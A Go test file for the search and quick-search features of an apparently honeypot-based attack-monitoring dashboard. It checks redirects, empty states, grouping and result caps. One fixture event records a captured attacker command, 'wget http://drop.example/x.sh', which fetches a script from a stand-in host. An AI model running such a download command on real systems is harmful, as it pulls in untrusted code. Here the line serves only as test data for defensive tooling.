package main

import (
	"encoding/json"
	"html/template"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"
)

func searchTestStore(t *testing.T) *store {
	t.Helper()
	now := time.Now().UTC()
	s := &store{}
	s.events = []storedEvent{
		{
			when: now, Time: now.Format(time.RFC3339), Sensor: "cowrie", SrcIP: "203.0.113.9",
			Country: "DE", Org: "Example Networks", ASN: 64500, Session: "sess-alpha",
			User: "root", Pass: "hunter2", HasCredential: true, Command: "wget http://drop.example/x.sh",
			Persona: "meridian-legacy", Site: "meridian-hamburg-dc1", Asset: "legacy-svc-02",
			Detail: "login.failed: root / hunter2",
		},
		{
			when: now, Time: now.Format(time.RFC3339), Sensor: "tanner", SrcIP: "198.51.100.7",
			Path: "/wp-login.php", Category: "sqli", Detail: "/wp-login.php [sqli]",
		},
	}
	return s
}

// A query naming one entity should land on that entity, not on a result list.
func TestSearchRedirectsToAnExactEntity(t *testing.T) {
	s := searchTestStore(t)
	for query, want := range map[string]string{
		"sess-alpha":  "/sessions/sess-alpha",
		"203.0.113.9": "/investigate/ip/203.0.113.9",
		"AS64500":     "/events?asn=64500",
	} {
		if got := s.searchRedirect(query); got != want {
			t.Fatalf("searchRedirect(%q) = %q, want %q", query, got, want)
		}
	}
	if got := s.searchRedirect("nothing-here"); got != "" {
		t.Fatalf("searchRedirect on an unknown value = %q, want no redirect", got)
	}
}

// The regression this replaces: a query that resembles a session or hash used
// to be routed to a page that did not exist, and the operator got a bare 404.
func TestSearchAnswersUnknownQueriesInsteadOf404(t *testing.T) {
	s := searchTestStore(t)
	tmpl := template.Must(template.New("dashboard").Funcs(templateFuncs(s, "")).Parse(pageTemplate))

	for _, query := range []string{"deadbeef", "totally-unknown-indicator"} {
		r := httptest.NewRequest(http.MethodGet, "/search?q="+template.URLQueryEscaper(query), nil)
		w := httptest.NewRecorder()
		s.serveSearch(w, r, tmpl)
		if w.Code != http.StatusOK {
			t.Fatalf("search for %q returned status %d, want 200", query, w.Code)
		}
		if !strings.Contains(w.Body.String(), "Nothing matched") {
			t.Fatalf("search for %q did not render the empty state", query)
		}
	}
}

func TestSearchGroupsMatchesAcrossSources(t *testing.T) {
	s := searchTestStore(t)

	groupTitles := func(page searchPage) string {
		var titles []string
		for _, g := range page.Groups {
			titles = append(titles, g.Title)
		}
		return strings.Join(titles, ",")
	}

	// A password only names a credential, so the answer stays that narrow.
	credentials := groupTitles(s.searchData("hunter2", filter{}))
	for _, want := range []string{"Credentials", "Events"} {
		if !strings.Contains(credentials, want) {
			t.Fatalf("groups %q are missing %q", credentials, want)
		}
	}
	if strings.Contains(credentials, "Attack sources") {
		t.Fatalf("groups %q claim a source match the password cannot produce", credentials)
	}

	// A network name reaches the source through its enrichment, not its address.
	if sources := groupTitles(s.searchData("Example Networks", filter{})); !strings.Contains(sources, "Attack sources") {
		t.Fatalf("groups %q are missing the enriched source match", sources)
	}

	paths := s.searchData("wp-login", filter{})
	found := false
	for _, g := range paths.Groups {
		if g.Title != "Requested paths" {
			continue
		}
		found = true
		if len(g.Hits) != 1 || g.Hits[0].Label != "/wp-login.php" {
			t.Fatalf("unexpected path hits: %#v", g.Hits)
		}
		if !strings.Contains(g.Hits[0].URL, "path=%2Fwp-login.php") {
			t.Fatalf("path hit does not link to the filtered explorer: %q", g.Hits[0].URL)
		}
	}
	if !found {
		t.Fatal("a path substring did not surface the Requested paths group")
	}

	if empty := s.searchData("   ", filter{}); len(empty.Groups) != 0 || empty.Total != 0 {
		t.Fatalf("a blank query produced results: %#v", empty)
	}
}

// One noisy category must not bury the others.
func TestSearchGroupsAreBounded(t *testing.T) {
	now := time.Now().UTC()
	events := make([]storedEvent, 0, searchGroupLimit+5)
	for index := 0; index < searchGroupLimit+5; index++ {
		events = append(events, storedEvent{
			when: now, Time: now.Format(time.RFC3339), Sensor: "cowrie",
			SrcIP: "203.0.113." + string(rune('0'+index%10)), Path: "/probe-" + string(rune('a'+index)),
			Detail: "probe",
		})
	}
	s := &store{events: events}
	for _, g := range s.searchData("/probe-", filter{}).Groups {
		if len(g.Hits) > searchGroupLimit {
			t.Fatalf("group %q returned %d hits, want at most %d", g.Title, len(g.Hits), searchGroupLimit)
		}
		if g.Title == "Requested paths" && g.More != 5 {
			t.Fatalf("group %q hid %d matches, want 5 with a link to the rest", g.Title, g.More)
		}
	}
}

// The command palette's live preview: an exact-entity match always leads, and
// a blank query produces no rows instead of the first page of everything.
func TestQuickSearchResultsLeadsWithAnExactMatch(t *testing.T) {
	s := searchTestStore(t)

	hits := s.quickSearchResults("sess-alpha")
	if len(hits) == 0 || hits[0].Group != "Exact match" || hits[0].URL != "/sessions/sess-alpha" {
		t.Fatalf("quickSearchResults(sess-alpha) = %#v, want an exact match leading", hits)
	}

	if hits := s.quickSearchResults("   "); hits != nil {
		t.Fatalf("a blank query produced results: %#v", hits)
	}

	if hits := s.quickSearchResults("hunter2"); len(hits) == 0 || hits[0].Group != "Credentials" {
		t.Fatalf("quickSearchResults(hunter2) = %#v, want the Credentials group", hits)
	}
}

// The preview stays capped even when the full results page has more to show.
func TestQuickSearchResultsAreCapped(t *testing.T) {
	now := time.Now().UTC()
	events := make([]storedEvent, 0, quickSearchLimit+5)
	for index := 0; index < quickSearchLimit+5; index++ {
		events = append(events, storedEvent{
			when: now, Time: now.Format(time.RFC3339), Sensor: "cowrie",
			SrcIP: "203.0.113." + string(rune('0'+index%10)), Path: "/probe-" + string(rune('a'+index)),
			Detail: "probe",
		})
	}
	s := &store{events: events}
	if hits := s.quickSearchResults("/probe-"); len(hits) != quickSearchLimit {
		t.Fatalf("quickSearchResults returned %d hits, want the capped %d", len(hits), quickSearchLimit)
	}
}

func TestServeQuickSearchReturnsJSONResults(t *testing.T) {
	s := searchTestStore(t)

	r := httptest.NewRequest(http.MethodGet, "/api/quick-search?q=hunter2", nil)
	w := httptest.NewRecorder()
	s.serveQuickSearch(w, r)

	if w.Code != http.StatusOK {
		t.Fatalf("serveQuickSearch status = %d, want 200", w.Code)
	}
	if ct := w.Header().Get("Content-Type"); ct != "application/json" {
		t.Fatalf("Content-Type = %q, want application/json", ct)
	}
	var body struct {
		Results []quickSearchHit `json:"results"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &body); err != nil {
		t.Fatalf("response is not valid JSON: %v", err)
	}
	if len(body.Results) == 0 {
		t.Fatalf("expected at least one result for a known credential")
	}

	// An empty query answers with an empty array, not null, so the client
	// never needs to special-case a missing "results" key.
	r = httptest.NewRequest(http.MethodGet, "/api/quick-search?q=", nil)
	w = httptest.NewRecorder()
	s.serveQuickSearch(w, r)
	if !strings.Contains(w.Body.String(), `"results":[]`) {
		t.Fatalf("blank query body = %q, want an empty results array", w.Body.String())
	}
}

func TestServeQuickSearchRejectsNonGET(t *testing.T) {
	s := searchTestStore(t)
	r := httptest.NewRequest(http.MethodPost, "/api/quick-search?q=hunter2", nil)
	w := httptest.NewRecorder()
	s.serveQuickSearch(w, r)
	if w.Code != http.StatusMethodNotAllowed {
		t.Fatalf("serveQuickSearch status = %d, want 405", w.Code)
	}
}
